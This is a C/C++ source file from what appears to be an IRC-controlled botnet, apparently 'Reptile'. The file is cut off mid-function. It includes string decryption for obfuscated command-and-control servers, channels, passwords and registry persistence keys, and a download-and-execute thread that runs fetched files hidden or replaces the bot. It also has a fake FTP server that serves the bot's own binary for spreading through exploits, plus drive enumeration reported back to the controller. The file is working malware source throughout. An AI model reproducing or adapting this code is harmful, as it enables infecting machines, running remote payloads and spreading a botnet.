#include "headers/includes.h"
#include "headers/functions.h"
#include "headers/ioctlcmd.h"
#include "headers/fudll.h"


// this is a nice all-in-one solution to encrypt/decrypt and it's fairly secure
// recommended even for novice users.
void Crypt(unsigned char *inp, DWORD inplen, unsigned char *key, DWORD keylen)
{
	//we will consider size of sbox 256 bytes
	//(extra byte are only to prevent any mishep just in case)
	unsigned char Sbox[257], Sbox2[257], temp = 0 , k = 0;
	unsigned long i=0, j=0, t=0, x=0;

	keylen = 0;

	//this unsecured key is to be used only when there is no input key from user
	unsigned char OurUnSecuredKey[49]; // CHANGE THIS!!!!!
	OurUnSecuredKey[0]=10; OurUnSecuredKey[1]=14; OurUnSecuredKey[2]=32; OurUnSecuredKey[3]=72;
	OurUnSecuredKey[4]=11; OurUnSecuredKey[5]=43; OurUnSecuredKey[6]=12; OurUnSecuredKey[7]=35;
	OurUnSecuredKey[8]=58; OurUnSecuredKey[9]=39; OurUnSecuredKey[10]=40; OurUnSecuredKey[11]=94;
	OurUnSecuredKey[12]=42; OurUnSecuredKey[13]=30; OurUnSecuredKey[14]=45; OurUnSecuredKey[15]=90;
	OurUnSecuredKey[16]=27; OurUnSecuredKey[17]=15; OurUnSecuredKey[18]=76; OurUnSecuredKey[19]=68;
	OurUnSecuredKey[20]=22; OurUnSecuredKey[21]=04; OurUnSecuredKey[22]=87; OurUnSecuredKey[23]=35;
	OurUnSecuredKey[24]=17; OurUnSecuredKey[25]=83; OurUnSecuredKey[26]=56; OurUnSecuredKey[27]=19;
	OurUnSecuredKey[28]=13; OurUnSecuredKey[29]=18; OurUnSecuredKey[30]=37; OurUnSecuredKey[31]=28;
	OurUnSecuredKey[32]=48; OurUnSecuredKey[33]=18; OurUnSecuredKey[34]=80; OurUnSecuredKey[35]=79;
	OurUnSecuredKey[36]=57; OurUnSecuredKey[37]=16; OurUnSecuredKey[38]=66; OurUnSecuredKey[39]=31;
	OurUnSecuredKey[40]=55; OurUnSecuredKey[41]=29; OurUnSecuredKey[42]=65; OurUnSecuredKey[43]=85;
	OurUnSecuredKey[44]=44; OurUnSecuredKey[45]=65; OurUnSecuredKey[46]=44; OurUnSecuredKey[47]=88;
	OurUnSecuredKey[48]=0;
	//static const int OurKeyLen = _tcslen(OurUnSecuredKey);    
	unsigned int OurKeyLen = strlen((char *)OurUnSecuredKey);  

    //always initialize the arrays with zero
	ZeroMemory(Sbox, sizeof(Sbox));
	ZeroMemory(Sbox2, sizeof(Sbox2));

    //initialize sbox i
	for(i = 0; i < 256U; i++)
		Sbox[i] = (unsigned char)i;

    //whether user has sent any input key
	if(keylen) {
		//initialize the sbox2 with user key
		for(i = 0; i < 256U ; i++) {
			if(j == keylen)
				j = 0;
			Sbox2[i] = key[j++];
		}    
	} else {
		//initialize the sbox2 with our key
		for(i = 0; i < 256U ; i++) {
			if(j == (unsigned long)OurKeyLen)
				j = 0;
			Sbox2[i] = OurUnSecuredKey[j++];
		}
	}

	j = 0 ; //Initialize j
	//scramble sbox1 with sbox2
	for(i = 0; i < 256; i++) {
		j = (j + (unsigned long) Sbox[i] + (unsigned long) Sbox2[i]) % 256U ;
		temp =  Sbox[i];                    
		Sbox[i] = Sbox[j];
		Sbox[j] =  temp;
	}

	i = j = 0;
	for(x = 0; x < inplen; x++) {
		//increment i
		i = (i + 1U) % 256U;
		//increment j
		j = (j + (unsigned long) Sbox[i]) % 256U;

		//Scramble SBox #1 further so encryption routine will
		//will repeat itself at great interval
		temp = Sbox[i];
		Sbox[i] = Sbox[j] ;
		Sbox[j] = temp;

		//Get ready to create pseudo random  byte for encryption key
		t = ((unsigned long) Sbox[i] + (unsigned long) Sbox[j]) %  256U ;

		//get the random byte
		k = Sbox[t];

		//xor with the data and done
		inp[x] = (unsigned char)(inp[x] ^ k);
	}

#ifdef _DEBUG
	printf("crypt: %s\n",inp);
#endif
	return;
}

void Encrypt2(char *str)
{
	for(int i=0; i<strlen(str);i++)
	{
		str[i]^=215;
	}
}

#ifndef NO_CRYPT
extern char cononstart[];
void decryptstrings(int authsize, int versionsize, int serversize)
{
	int i;

//	Crypt((unsigned char *)movepath,strlen(movepath),NULL,0); // the % fucks up the crypt
	Crypt((unsigned char *)filename,strlen(filename),NULL,0);

#ifndef NO_FCONNECT
	Crypt((unsigned char *)cononstart,strlen(cononstart),NULL,0);
#endif

	Crypt((unsigned char *)version,strlen(version),NULL,0);

#ifndef NO_SERVICE
	Crypt((unsigned char *)servicename,strlen(servicename),NULL,0);
	Crypt((unsigned char *)servicedisplayname,strlen(servicedisplayname),NULL,0);
	Crypt((unsigned char *)servicedesc,strlen(servicedesc),NULL,0);
#else
	Crypt((unsigned char *)runkey.subkey,strlen(runkey.subkey),NULL,0);
	Crypt((unsigned char *)runkey.name,strlen(runkey.name),NULL,0);
#endif

	Crypt((unsigned char *)password,strlen(password),NULL,0);
	
	for(i=0;i < authsize;i++)
		Crypt((unsigned char *)authost[i],strlen(authost[i]),NULL,0);

#ifndef NO_VERSION_REPLY
	for(i=0;i < versionsize;i++)
		Crypt((unsigned char *)versionlist[i],strlen(versionlist[i]),NULL,0);
#endif

	for(i=0;i < serversize;i++)
	{
		Crypt((unsigned char *)servers[i].host,strlen(servers[i].host),NULL,0);
		Crypt((unsigned char *)servers[i].pass,strlen(servers[i].pass),NULL,0);
		Crypt((unsigned char *)servers[i].chan,strlen(servers[i].chan),NULL,0);
		Crypt((unsigned char *)servers[i].chanpass,strlen(servers[i].chanpass),NULL,0);
		Crypt((unsigned char *)servers[i].modeonconn,strlen(servers[i].modeonconn),NULL,0);
		Crypt((unsigned char *)servers[i].modeonjoin,strlen(servers[i].modeonjoin),NULL,0);
		Crypt((unsigned char *)servers[i].exploitchan,strlen(servers[i].exploitchan),NULL,0);
		Crypt((unsigned char *)servers[i].sniffchan,strlen(servers[i].sniffchan),NULL,0);
		Crypt((unsigned char *)servers[i].warningchan,strlen(servers[i].warningchan),NULL,0);
	}

#ifndef NO_MELT
	Crypt((unsigned char *)meltkey.subkey,strlen(meltkey.subkey),NULL,0);
	Crypt((unsigned char *)meltkey.name,strlen(meltkey.name),NULL,0);
#endif
#ifndef NO_RECORD_UPTIME
	Crypt((unsigned char *)rupkey.subkey,strlen(rupkey.subkey),NULL,0);
	Crypt((unsigned char *)rupkey.name,strlen(rupkey.name),NULL,0);
#endif
#ifndef NO_INSTALLED_TIME
	Crypt((unsigned char *)itkey.subkey,strlen(itkey.subkey),NULL,0);
	Crypt((unsigned char *)itkey.name,strlen(itkey.name),NULL,0);
#endif

	/*Crypt((unsigned char *)botid,strlen(botid),NULL,0);
	Crypt((unsigned char *)version,strlen(version),NULL,0);
	Crypt((unsigned char *)server,strlen(server),NULL,0);
	Crypt((unsigned char *)serverpass,strlen(serverpass),NULL,0);
	Crypt((unsigned char *)channel,strlen(channel),NULL,0);
	Crypt((unsigned char *)chanpass,strlen(chanpass),NULL,0);
	Crypt((unsigned char *)server2,strlen(server2),NULL,0);
	Crypt((unsigned char *)channel2,strlen(channel2),NULL,0);
	Crypt((unsigned char *)chanpass2,strlen(chanpass2),NULL,0);
	Crypt((unsigned char *)filename,strlen(filename),NULL,0);
	Crypt((unsigned char *)keylogfile,strlen(keylogfile),NULL,0);
	Crypt((unsigned char *)valuename,strlen(valuename),NULL,0);
	Crypt((unsigned char *)nickconst,strlen(nickconst),NULL,0);
	Crypt((unsigned char *)modeonconn,strlen(modeonconn),NULL,0);
	Crypt((unsigned char *)chanmode,strlen(chanmode),NULL,0);
	Crypt((unsigned char *)exploitchan,strlen(exploitchan),NULL,0);
	Crypt((unsigned char *)keylogchan,strlen(keylogchan),NULL,0);
	Crypt((unsigned char *)psniffchan,strlen(psniffchan),NULL,0);

	for(i=0;i < authsize;i++)
		Crypt((unsigned char *)authost[i],strlen(authost[i]),NULL,0);

	for(i=0;i < versionsize;i++)
		Crypt((unsigned char *)versionlist[i],strlen(versionlist[i]),NULL,0);

	Crypt((unsigned char *)regkey1,strlen(regkey1),NULL,0); // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	Crypt((unsigned char *)regkey2,strlen(regkey2),NULL,0); // "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
	Crypt((unsigned char *)regkey3,strlen(regkey3),NULL,0); // "Software\\Microsoft\\OLE"
	Crypt((unsigned char *)regkey4,strlen(regkey4),NULL,0); // "SYSTEM\\CurrentControlSet\\Contol\\Lsa"*/

	return;
};
#endif


#ifndef NO_DOWNLOAD
extern char str_thread_fail[];
extern char str_quit_upd[];
// function for downloading files/updating
DWORD WINAPI DownloadThread(LPVOID param)
{
	char buffer[IRCLINE];
	DWORD r, d, start, total, speed;

	NTHREAD dl = *((NTHREAD *)param);
	NTHREAD *dls = (NTHREAD *)param;
	dls->gotinfo = TRUE;
	IRC* irc=(IRC*)dl.conn;

	char dlfrom[MAX_HOSTNAME];
	char dlto[MAX_PATH];
	strncpy(dlfrom,dl.data1,sizeof(dlfrom));
	strncpy(dlto,dl.data2,sizeof(dlto));

	HANDLE fh = fInternetOpenUrl(ih, dlfrom, NULL, 0, 0, 0);
	if (fh != NULL)
	{
		HANDLE f = CreateFile(dlto, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (f < (HANDLE)1)
		{
			if (!dl.silent)
				irc->privmsg(dl.target,"%s Couldn't open file for writing: %s.",(dl.bdata1?update_title:download_title),dlto);

			fInternetCloseHandle(fh);
			clearthread(dl.threadnum);
			ExitThread(0);
		}

		total = 0;
		start = GetTickCount();
		char *fileTotBuff=(char *)malloc(512000);
		do
		{
			ZeroMemory(buffer,sizeof(buffer));
			fInternetReadFile(fh, buffer, sizeof(buffer), &r);
			WriteFile(f, buffer, r, &d, NULL);
			
			if ((total) < 512000)
			{
				unsigned int bytestocopy;
				bytestocopy=512000-total;
				if (bytestocopy>r) 
					bytestocopy=r;
				memcpy(&fileTotBuff[total],buffer,bytestocopy);
			}
			total+=r;
		}
		while (r > 0);

		speed = total / (((GetTickCount() - start) / 1000) + 1);
		free(fileTotBuff);
		CloseHandle(f);
		fInternetCloseHandle(fh);

		if (!dl.silent)
			irc->privmsg(dl.target,"%s File download: %.1fKB to: %s @ %.1fKB/sec.",(dl.bdata1?update_title:download_title), total/1024.0, dlto, speed/1024.0);

		//download isn't an update
		if (!dl.bdata1 && dl.bdata2)
		{
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			BOOL hide=dl.bdata3, wait=dl.verbose;
			char path[MAX_PATH];
			strncpy(path,dlto,sizeof(path));
			if (!fPathRemoveFileSpec(path))
			{
				if (!dl.silent)
					irc->privmsg(dl.target,"%s Couldn't parse path, error: <%d>", download_title, GetLastError());
				return 1;
			}
			ZeroMemory(&si,sizeof(si));
			ZeroMemory(&pi,sizeof(pi));
			si.cb=sizeof(si);
			si.dwFlags = STARTF_USESHOWWINDOW;
			si.wShowWindow = (hide?SW_HIDE:SW_SHOW);

			if (!CreateProcess(NULL,dlto,NULL,NULL,FALSE,0,NULL,path,&si,&pi))
			{
				if (!dl.silent)
					irc->privmsg(dl.target,"%s Failed to create process: \"%s\", error: <%d>", download_title, dlto, GetLastError());
				return 1;
			}
			else
			{
				DWORD start=GetTickCount();//record this before the privmsg so we aren't off
				if (!dl.silent)
					irc->privmsg(dl.target,"%s Created process: \"%s\", PID: <%d>",download_title,dlto,pi.dwProcessId);
				
				if (dl.verbose)
				{	
					WaitForSingleObject(pi.hProcess,INFINITE);
					DWORD stop=GetTickCount();
					char ttime[120],stime[120];
					stime[0]='\0';
					DWORD total = ((stop - start)/1000);
					DWORD hours = (total%86400)/3600;
					DWORD minutes = ((total%86400)%3600)/60;
					DWORD seconds = ((total%86400)%3600)%60;
					if (hours>0)
					{
						sprintf(ttime," %d%s",hours,(hours==1?" hour":" hours"));
						strcat(stime,ttime);
					}
					sprintf(ttime," %.2d:%.2d",minutes,seconds);
					strcat(stime,ttime);

					irc->privmsg(dl.target,"%s Process Finished: \"%s\", Total Running Time: %s.",download_title,dlto,stime);
				}
				if (pi.hProcess) CloseHandle(pi.hProcess);
				if (pi.hThread) CloseHandle(pi.hThread);
			}

			//fShellExecute(0, "open", dlto, NULL, NULL, (dl.bdata3?SW_HIDE:SW_SHOW));
			//if (!dl.silent)
			//	irc->privmsg(dl.target,"%s Opened: %s.",download_title,dlto);

		// download is an update
		}
		else if (dl.bdata1)
		{
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));
			ZeroMemory(&sinfo, sizeof(STARTUPINFO));
			sinfo.cb = sizeof(sinfo);
			sinfo.wShowWindow = SW_HIDE;
			if (CreateProcess(NULL, dlto, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS|DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE)
			{
				uninstall(TRUE,(dl.idata1==1?TRUE:FALSE));
				irc->quit(str_quit_upd);
				Sleep(FLOOD_DELAY);
				irc->disconnect();
				fWSACleanup();
				ExitProcess(EXIT_SUCCESS);
			}
			else
			{
				if (!dl.silent)
					irc->privmsg(dl.target,"%s Update failed: Error executing file: %s.",update_title,dlto);
			}
		}
	}
	else
	{
		if (!dl.silent)
			irc->privmsg(dl.target,"%s Bad URL or DNS Error, error: <%d>",(dl.bdata1?update_title:download_title),GetLastError());
	}
	clearthread(dl.threadnum);
	ExitThread(0);
}
#endif


#ifndef NO_DRIVEINFO

const char *DriveType(LPCSTR Drive)
{
	switch(GetDriveType(Drive)) {
	case DRIVE_UNKNOWN:
		return ("Unknown");
	case DRIVE_NO_ROOT_DIR:
		return ("Invalid");
	case DRIVE_FIXED:
		return ("Disk");
	case DRIVE_REMOTE:
		return ("Network");
	case DRIVE_CDROM:
		return ("Cdrom");
	case DRIVE_RAMDISK:
		return ("RAM");
	default:
		return ("?");
	}
}


DKSP DiskSpace(LPCSTR Drive)
{
	DKSP dksp;
	dksp.AvailableBytes=-1;
	dksp.FreeBytes=-1;
	dksp.TotalBytes=-1;
#ifndef _DEBUG
	fSetErrorMode(SEM_FAILCRITICALERRORS);// So drive does not ask for disk
#endif
	GetDiskFreeSpaceEx(Drive,(PULARGE_INTEGER)&dksp.AvailableBytes,
			(PULARGE_INTEGER)&dksp.TotalBytes,(PULARGE_INTEGER)&dksp.FreeBytes);
#ifndef _DEBUG
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);
#endif
	return (dksp);
}

DKSPN DiskSpaceN(LPCSTR Drive,int Size,char *SizeChr)
{
	DKSPN dkspn;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 || dksp.FreeBytes == -1 || dksp.TotalBytes == -1) {
		sprintf(dkspn.Available, "failed");
		sprintf(dkspn.Free, "failed");
		sprintf(dkspn.Total, "failed");
	} else {
		_snprintf(dkspn.Available,sizeof(dkspn.Available),"%s%s",commaI64(dksp.AvailableBytes/Size),SizeChr);
		_snprintf(dkspn.Free,sizeof(dkspn.Free),"%s%s",commaI64(dksp.FreeBytes/Size),SizeChr);
		_snprintf(dkspn.Total,sizeof(dkspn.Total),"%s%s",commaI64(dksp.TotalBytes/Size),SizeChr);
	}

	return (dkspn);
}

DKSPT DiskSpaceTotal(LPCSTR Drive,int Size)
{
	DKSPT dkspt;
	DKSP dksp=DiskSpace(Drive);

	if(dksp.AvailableBytes == -1 && dksp.FreeBytes == -1 && dksp.TotalBytes == -1) {
		dkspt.AvailableT=0;
		dkspt.FreeT=0;
		dkspt.TotalT=0;
	} else {
		dkspt.AvailableT=dksp.AvailableBytes/Size;
		dkspt.FreeT=dksp.FreeBytes/Size;
		dkspt.TotalT=dksp.TotalBytes/Size;
	}

	return (dkspt);
}

void DriveSpaceN(char *target, void *conn, LPCSTR Drive, int Size, char *SizeChr)
{
	IRC* irc=(IRC*)conn;
	DKSPN dkspn=DiskSpaceN(Drive,Size,SizeChr);

	if (!strcmp(dkspn.Total,"failed"))
		irc->privmsg(target,"%s Drive (%s): Failed to stat, device not ready.", DriveType(Drive), Drive);
	else
		irc->privmsg(target,"%s Drive (%s), total: %s, free: %s, available: %s.", DriveType(Drive), Drive, dkspn.Total, dkspn.Free, dkspn.Available);
	return;
}

void DriveInfoTotal(char *target, void *conn, int Size, char *SizeChr)
{
	IRC* irc=(IRC*)conn;
	__int64 tmpAvail=0;
	__int64 tmpFree=0;
	__int64 tmpTotal=0;
	
	DWORD dwSize = GetLogicalDriveStrings(0, NULL);
	LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
	GetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);
	LPCTSTR pszDrv = pszDrives;
	while (*pszDrv) {
		if (strcmp(pszDrv,"A:\\") != 0) {
			DKSPT dkspt;
			dkspt=DiskSpaceTotal(pszDrv, Size);
			tmpAvail+=dkspt.AvailableT;
			tmpFree+=dkspt.FreeT;
			tmpTotal+=dkspt.TotalT;
		}
		pszDrv += _tcslen (pszDrv) + 1;
	}
	free(pszDrives);
	
	char cAvail[50],cFree[50],cTotal[50];
	irc->privmsg(target,"Drive Totals (N/A), total: %s%s, free: %s%s, available: %s%s.",
		commaI64(tmpTotal,cTotal), SizeChr, commaI64(tmpFree,cFree), SizeChr, commaI64(tmpAvail,cAvail), SizeChr);
	return;
}
DKSPT DriveInfoL(int Size, char *SizeChr, LPCSTR Drive)
{	
	DKSPT dksptr;
	dksptr.AvailableT=0;
	dksptr.FreeT=0;
	dksptr.TotalT=0;
	
	if (Drive != 0) {
		DKSPT dkspt;
		dkspt=DiskSpaceTotal(Drive, Size);
		dksptr.AvailableT+=dkspt.AvailableT;
		dksptr.FreeT+=dkspt.FreeT;
		dksptr.TotalT+=dkspt.TotalT;
		return (dksptr);
	}
	
	if (Drive == 0) {
		DWORD dwSize = GetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		GetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);
		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {
			if (strcmp(pszDrv,"A:\\") != 0) {
				DKSPT dkspt;
				dkspt=DiskSpaceTotal(pszDrv, Size);
				dksptr.AvailableT+=dkspt.AvailableT;
				dksptr.FreeT+=dkspt.FreeT;
				dksptr.TotalT+=dkspt.TotalT;
			}
			pszDrv += _tcslen (pszDrv) + 1;
		}
		free(pszDrives);
	}

	return (dksptr);
}

void DriveInfo(char *target, void *conn, LPCSTR Drive, BOOL mb, BOOL gb, BOOL silent)
{
	IRC* irc=(IRC*)conn;
	if (Drive) {
		if (!mb && !gb)		DriveSpaceN(target,conn,Drive,1024,"KB");
		else if (mb && !gb)	DriveSpaceN(target,conn,Drive,1048576,"MB");
		else if (!mb && gb) DriveSpaceN(target,conn,Drive,1073741824,"GB");
	} else {
		DWORD dwSize = GetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
		GetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);

		if (!silent)
			irc->privmsg(target,"%s Listing drives:",drives_title);

		LPCTSTR pszDrv = pszDrives;
		while (*pszDrv) {			
			if (strcmp(pszDrv,"A:\\") != 0) {
				if (!mb && !gb)		DriveSpaceN(target,conn,pszDrv,1024,"KB");
				else if (mb && !gb)	DriveSpaceN(target,conn,pszDrv,1048576,"MB");
				else if (!mb && gb) DriveSpaceN(target,conn,pszDrv,1073741824,"GB");
			}
			pszDrv += _tcslen (pszDrv) + 1;
		}
		if (!mb && !gb)		DriveInfoTotal(target,conn,1024,"KB");
		else if (mb && !gb)	DriveInfoTotal(target,conn,1048576,"MB");
		else if (!mb && gb) DriveInfoTotal(target,conn,1073741824,"GB");
		
		if (!silent)
			irc->privmsg(target,"%s End of list.",drives_title);
		
		free(pszDrives);
	}
	
//	addlogv(MAINLOG,"%s Displayed drive list: %s, %s.", drives_title,(Drive?Drive:"All Drives"), (mb?"MB": (gb?"GB":"KB") ) );
	return;
}

DWORD WINAPI DriveThread(LPVOID param) {
	NTHREAD dinfo = *((NTHREAD *)param);
	NTHREAD *dinfos = (NTHREAD *)param;
	dinfos->gotinfo = TRUE;

	DriveInfo(dinfo.target,dinfo.conn,dinfo.data1, dinfo.bdata1, dinfo.bdata2, dinfo.silent);

	clearthread(dinfo.threadnum);
	return 0;

}
#endif


#ifndef NO_EFTPD

#pragma warning(disable : 4018)

int	FTP_PORT;
SOCKET listener;

DWORD WINAPI ftpd(LPVOID pParam) {
	FTP ftp = *((FTP *)pParam);
	FTP *ftps = (FTP *)pParam;
	ftps->gotinfo = TRUE;
	IRC* irc=(IRC*)ftp.conn;
	
	SOCKET newfd;
	char sendbuf[IRCLINE];
	struct sockaddr_in server_address;
	struct sockaddr_in remoteaddr;
	long h;
	int reuse_addr = 1;
	unsigned long mode = 1;
	int fdmax;
	int i;
	int addrlen;
	int nbytes;
	
	char buf[100];
	char tmpbuf[100];
	char tmpbuf2[100];
	char a[4];
	char b[4];
	char c[4];
	char d[4];
	char p1[50];
	char p2[50];
	char tmpip[15];
	int po,po2;

	struct fd_set master;   // master file descriptor list
	struct fd_set read_fds; // temp file descriptor list for select()

	FD_ZERO(&master);		// clear the master and temp sets
	FD_ZERO(&read_fds);

	FTP_PORT = ftp.port;
	listener = fsocket(AF_INET, SOCK_STREAM, 0);
	fsetsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse_addr,sizeof(reuse_addr));
	fioctlsocket(listener, FIONBIO, &mode);

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY;
	server_address.sin_port = fhtons(FTP_PORT);

	if (fbind(listener, (struct sockaddr *) &server_address,sizeof(server_address)) < 0 ) {
		return 1;
	}

	flisten(listener,10);

	FD_SET(listener, &master);

	fdmax = listener;

	while(1) {
		read_fds = master;
		if (fselect(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
			return 1;
    	}
		for(i = 0; i <= fdmax; i++) {
			ZeroMemory(buf,sizeof(buf));
			ZeroMemory(tmpbuf,sizeof(tmpbuf));
			if (fFD_ISSET(i, &read_fds)) {
				if (i == (int)listener) {
					addrlen = sizeof(remoteaddr);
					if ((newfd = faccept(listener, (struct sockaddr *)&remoteaddr,&addrlen)) != -1) {
						FD_SET(newfd, &master);
						if ((int)newfd > fdmax) {
							fdmax = newfd;
						}
						fsend(newfd, "220 Reptile welcomes you..\r\n",28 , 0);
					}
				} else {
					if ((nbytes = frecv(i, buf, sizeof(buf), 0)) <= 0) {
						FD_CLR(i, &master);
						fclosesocket(i);
					} else {

#ifdef _DEBUG
						printf("FTP Recieved: %s\n",buf);
#endif
						sscanf(buf,"%s %s",tmpbuf,tmpbuf2);
						if (strcmp(tmpbuf,"USER") == 0) {
							fsend(i,"331 Password required\r\n",23,0);
						}
						else if (strcmp(tmpbuf,"PASS") == 0) {
							fsend(i,"230 User logged in.\r\n",21,0);
						}
						else if (strcmp(tmpbuf,"SYST") == 0) {
							fsend(i,"215 StnyFtpd\r\n",14,0);
						}
						else if (strcmp(tmpbuf,"REST") == 0) {
							fsend(i,"350 Restarting.\r\n",17,0);
						}
						else if (strcmp(tmpbuf,"PWD") == 0) {
							fsend(i,"257 \"/\" is current directory.\r\n",31,0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"A") == 0)) {
							fsend(i,"200 Type set to A.\r\n",20,0);
						}
						else if ((strcmp(tmpbuf,"TYPE") == 0) && (strcmp(tmpbuf2,"I") == 0)) {
							fsend(i,"200 Type set to I.\r\n",20,0);
						}
						else if (strcmp(tmpbuf,"PASV") == 0) {
							fsend(i,"425 Passive not supported on this server\r\n",44,0);
						}
						else if (strcmp(tmpbuf,"LIST") == 0) {
							fsend(i,"226 Transfer complete\r\n",25,0);
							if (irc->has_master())
								irc->notice_masters("%s %s LIST request from: %s",warn_title,ftp_title,GetIP(i));
							else
								irc->privmsg(servers[curserver].warningchan,"%s %s LIST request from: %s",warn_title,ftp_title,GetIP(i));
						}
						else if (strcmp(tmpbuf,"PORT") == 0) {
							sscanf(buf,"%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[^\n]",a,b,c,d,p1,p2);
							po = atoi(p1);
							po2 = atoi(p2);
							ZeroMemory(p1,sizeof(p1));
							sprintf(p1,"%x%x\n",po,po2);
							h = strtoul(p1, NULL, 16);
							sprintf(tmpip,"%s.%s.%s.%s",a,b,c,d);
							fsend(i,"200 PORT command successful.\n",29,0);

						}
						else if (strcmp(tmpbuf,"RETR") == 0) {
							if (!ftp.silent && ftp.verbose)
								irc->privmsg(ftp.chan,"%s Started send to IP: %s.",ftp_title,tmpip);
							fsend(i,"150 Opening BINARY mode data connection\n",40,0);
							SOCKET data_sock;
							if(FTP_Data_Connect(tmpip,(int)h,sendbuf,ftp.conn,ftp.chan,ftp.silent,data_sock) != 0) {
								int transfered=0;
								if ((transfered=FTP_Data_Transfer(data_sock)) > 0)
								{
									fsend(i,"226 Transfer complete.\n",23 , 0);
									eftpsends++;
									if (!ftp.silent)
									{
										if (ftp.verbose)
											irc->privmsg(ftp.chan,"%s File transfer complete to IP: %s, File: %s, Size: %s bytes, Total sends: %i.",ftp_title,tmpip,ftp.filename,commaI64(transfered),eftpsends);
										else
											irc->privmsg(ftp.chan,"%s File transfer complete to IP: %s.", ftp_title, tmpip);
									}
								}
								else
								{
									fsend(i,"226 Transfer complete.\n",23 , 0);
								}
							} else {
								fsend(i,"425 Can't open data connection.\n",32,0);
							//	if (!ftp.silent)
							//	{
							//		irc->privmsg(ftp.chan,"%s Failed to send file to IP: %s.",ftp_title,tmpip);
							//	}
							}
						}
						else if (strcmp(tmpbuf,"QUIT") == 0) {
							fsend(i,"221 Goodbye, happy rooting.\r\n",29 , 0);
						}
						else {
							fsend(i,"503 Command not understood.\r\n",29,0);
						}
						ZeroMemory(buf,sizeof(buf));
					}
				}
			}
		}
	}
	return 1;
}

int FTP_Data_Connect(char *ip,int port,char *err,void *conn,char *target,BOOL silent,SOCKET &data_sock)
{
	IRC* irc=(IRC*)conn;
	struct sockaddr_in server;

	data_sock = fsocket(AF_INET, SOCK_STREAM, 0);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = finet_addr(ip);
    server.sin_port = fhtons(port);

	if (fconnect(data_sock,(struct sockaddr *)&server, sizeof(struct sockaddr)) == -1)
	{
		if (!silent)
			irc->privmsg(target,"%s Couldn't open data connection to: %s:%i, error: <%d>.",ftp_title,ip,port,fWSAGetLastError());
		fclosesocket(data_sock);
		return 0;
	}
	return 1;
}

int FTP_Data_Transfer(SOCKET data_sock)
{
	unsigned char fileBuf[4096]; FILE *fp=NULL;
	char myfname[MAX_PATH];
	int count=4096;
	GetModuleFileName(NULL,myfname,sizeof(myfname));
	fp=fopen(myfname, "rb");
	int sent=0;
	long filesize=0;
	if (fp)
	{
		fseek(fp, 0, SEEK_END); filesize=ftell(fp); fseek(fp, 0, SEEK_SET);
		int written=0;
		while(!feof(fp))
		{
			written=0;
			int retval;
			ZeroMemory(fileBuf,sizeof(fileBuf));
			count=fread(fileBuf, sizeof(char), 2048, fp);
			if(ferror(fp)) break;
			while(written<count)
			{
				retval = fsend(data_sock, (char*)fileBuf, count, 0);
				sent+=retval;
				if (retval = SOCKET_ERROR)
					break;
				written+=retval;
			}
		}
	}
	fclose(fp);
	fclosesocket(data_sock);
	if ((int)filesize == sent)
		return sent;
	else
		return 0;
}

void killftpd(char *target,void *conn,BOOL silent,BOOL verbose)
{
	IRC* irc=(IRC*)conn;
	BOOL killed = FALSE;
	int tnum;
	if ((tnum=findthreadnum(FTPD_THREAD)) > 0)
	{
		TerminateThread(threads[tnum].tHandle, 0);
		if (threads[tnum].tHandle != 0) 
			killed = TRUE;
		
		threads[tnum].tHandle = 0;
		threads[tnum].id = 0;
		threads[tnum].parent = 0;
		threads[tnum].pid = 0; 
		threads[tnum].name[0] = '\0';

		fclosesocket(listener);
	}

	if (killed)
	{
		if (!silent)
			irc->privmsg(target,"%s %s stopped. (%d thread(s) stopped.)",threads_title,"Exploit FTPD",1);
	}
	else
	{
		if (!silent)
			irc->privmsg(target,"%s No %s thread found.",threads_title,"Exploit FTPD");
	}
	return;
}

#endif




logged_in logins[MAX_LOGINS];

IRC::IRC()
{
	hooks=0;
	clear_logins();
	connected=false;
	bconnect=true;
	cur_nick=0;

#ifndef NO_OPENSSL
	// Initialize SSL Socket
	ssl_socket.Init();
#endif NO_OPENSSL
}

IRC::~IRC()
{
	if (hooks)
		delete_irc_command_hook(hooks);
}

DWORD dwLastRecv;
DWORD WINAPI PingTimeoutThread(LPVOID param)
{
	NTHREAD timeout = *((NTHREAD *)param);
	NTHREAD *timeouts = (NTHREAD *)param;
	timeouts->gotinfo = TRUE;
	IRC* irc=(IRC*)timeout.conn;

	while(1)
	{
		if (((GetTickCount()/1000)-(dwLastRecv/1000)) > PING_TIMEOUT)
		{
			irc->quit("Ping Timeout? (%d-%d)%d/%d",(GetTickCount()/1000),(dwLastRecv/1000),((GetTickCount()/1000)-(dwLastRecv/1000)),PING_TIMEOUT);
			ExitThread(0);
		}
#ifdef _DEBUG
		printf("PingTimeoutThread: %d-%d=%d>%d?%s\n",(GetTickCount()/1000),(dwLastRecv/1000),(GetTickCount()/1000)-(dwLastRecv/1000),PING_TIMEOUT,(((GetTickCount()/1000)-(dwLastRecv/1000)) > PING_TIMEOUT)?"TRUE":"FALSE");
#endif
		Sleep(PING_TIMEOUT*1000);
	}
	ExitThread(0);
}

/////////////////////////////////////////////////////////////////////////////isend
int IRC::isend(int socket, char *data, ...)
{
	char tbuffer[IRCLINE];

	va_list argp;
	va_start(argp,data); 
	_vsnprintf(tbuffer,sizeof(tbuffer),data,argp);
	
#ifdef _DEBUG
	char ntbuffer[IRCLINE];
